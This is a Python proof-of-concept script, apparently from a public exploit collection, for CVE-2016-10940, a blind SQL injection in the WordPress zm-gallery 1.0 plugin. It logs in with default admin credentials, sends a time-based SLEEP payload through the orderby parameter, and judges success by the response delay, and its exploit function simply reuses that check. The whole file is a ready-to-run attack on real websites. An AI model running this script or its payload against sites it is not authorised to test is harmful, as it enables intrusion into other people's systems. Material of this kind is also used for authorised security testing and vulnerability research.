import requests
import time

# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''The zm-gallery plugin 1.0 for WordPress SQLI''',
        "description": '''The zm-gallery plugin 1.0 for WordPress has SQL injection via the order parameter.''',
        "severity": "high",
        "references": [
            "https://wpscan.com/vulnerability/c0cbd314-0f4f-47db-911d-9b2e974bd0f6", 
            "https://lenonleite.com.br/en/2016/12/16/zm-gallery-1-plugin-wordpress-blind-injection/", 
            "https://nvd.nist.gov/vuln/detail/CVE-2016-10940"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2016-10940",
            "cwe-id": "CWE-89"
        },
        "metadata":{
            "vuln-target": "https://github.com/cckuailong/reapoc/tree/main/2016/CVE-2016-10940/vultarget"
        },
        "tags": ["cve", "cve2016", "sqli", "wp", "wordpress", "wp-plugin", "authenticated"],
    }


# Vender Fingerprint
def fingerprint(url):
    username = "admin"
    password = "admin"
    s = requests.Session()
    path = """/wp-login.php"""
    method = "POST"
    data = """log={username}&pwd={password}&wp-submit=Log+In&testcookie=1""".format(username=username, password=password)
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
    resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
    
    resp1 = s.get(url+"/wp-admin/admin.php?page=zm_gallery")
    if "ZM Gallery Plugin" in resp1.text:
        return True
    else:
        return False

# Proof of Concept
def poc(url):
    result = {}
    username = "admin"
    password = "admin"
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/wp-login.php"""
        method = "POST"
        data = """log={username}&pwd={password}&wp-submit=Log+In&testcookie=1""".format(username=username, password=password)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-admin/admin.php?page=zm_gallery&orderby=1%20AND%20(SELECT%204291%20FROM%20(SELECT(SLEEP(3)))cxXu)&order=desc"""
        method = "GET"
        data = """"""
        headers = {}
        time1 = time.time()
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
        time2 = time.time()

        if "ZM Gallery Plugin" in resp1.text and 3 <= (time2-time1) < 10:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url